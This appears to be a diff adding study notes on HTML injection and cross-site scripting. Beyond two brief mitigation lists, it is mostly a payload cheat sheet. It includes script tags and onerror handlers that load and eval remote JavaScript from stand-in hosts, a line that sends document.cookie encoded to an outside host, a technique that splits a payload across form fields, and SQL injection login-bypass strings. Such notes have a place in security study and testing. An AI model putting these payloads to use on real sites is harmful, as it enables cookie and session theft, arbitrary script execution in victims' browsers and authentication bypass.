@@ -1,0 +1,64 @@
+HTML Injection
+Cross Site Scripting
+
+HTML Injection:
+<html>
+<h1>Hello<h1>
+</html>
+
+<button>Click Me</button>
+<button onclick="window.location.href='http://example.com'">It's Me</button>
+
+Mitigations:-
+         1. Input Validation, Don not allow any HTML tags/ entities
+		 2. Encoding (HTML Encoding/ URL/ Percentage)
+
+
+Cross Site Scripting:
+Reflected XSS:-
+                 Requirement/Rules
+				 1. Reflection
+				 2. Execution
+Stored XSS
+DOM XSS: Document, Object, Model
+
+REFLECTED XSS
+<script>alert(1)</script>
+<script>alert("Hactify")</script>
+<script>alert(document.cookie)</script>
+<script src="https://www.example.com/XSS.js"></script>
+<script src=http:example.com/x.js></script>
+<script src=http:abcd.ef></script>
+<img src=1 onerror="alert('XSS')">
+<img src=x onerror=alert(1)>
+<img src/onerror="fetch('http:example.com/X.js').then((r)=>r.text()).then(t=>eval(t))">
+<img src/onerror=import('http:abcd.ef')>
+<img src/onerror=import('http:10.10.10.10')>
+<img src/onerror=$.getScript('http:example.com')>
+<img src/onerror=s=document.createElement('script');s.src='http:example.com/X.js';document.body.appendChild(s)>
+<img src/onerror=”alert/**/(‘XSS’)”>Test
+<img src/onerror="localStorage.setItem(1,/**/'fetch(\'http:example.com/X.js\')')">
+<img src/onerror="a=localStorage;a.setItem(1,/**/a.getItem(1)+'.then((r)=>r.text())')">
+<img src/onerror="a=localStorage;a.setItem(1,/**/a.getItem(1)+'.then(t=>eval(t))')">
+<img src/onerror="eval(localStorage.getItem(1))">
+<img src/onerror="a=new Image;a.src=/**/'http:abcd.ef?'+btoa(document.cookie)">
+
+document.getElementById('ctable').rows[2].cells[2].innerHTML = "Totally not JavaScript"
+document.getElementById('ctable').rows[2].style.display="none";
+
+Firstname: <img src/onerror="a=atob(document.getElementById/*
+          : */('ctable').rows[2].cells[2].innerHTML);eval(a)">
+Lastname
+
+
+
+Mitigations:-
+         1. Input Validation, Don not allow any HTML tags/ entities
+		 2. Encoding (HTML Encoding/ URL/ Percentage)
+		 
+admin' OR '1'= '1
+admin'or 1=1 or' '='
+		 
+##BASE64
+c29sZGllcg==
+aW5kaWE=		 
